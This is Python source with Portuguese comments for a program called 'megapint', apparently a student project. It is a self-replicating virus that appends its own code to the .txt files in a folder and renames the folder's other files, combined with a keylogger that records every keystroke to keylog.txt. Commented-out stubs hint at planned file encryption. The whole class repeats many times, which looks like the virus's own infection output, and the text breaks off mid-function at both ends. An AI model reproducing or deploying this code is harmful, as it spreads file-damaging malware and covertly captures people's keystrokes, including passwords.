        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

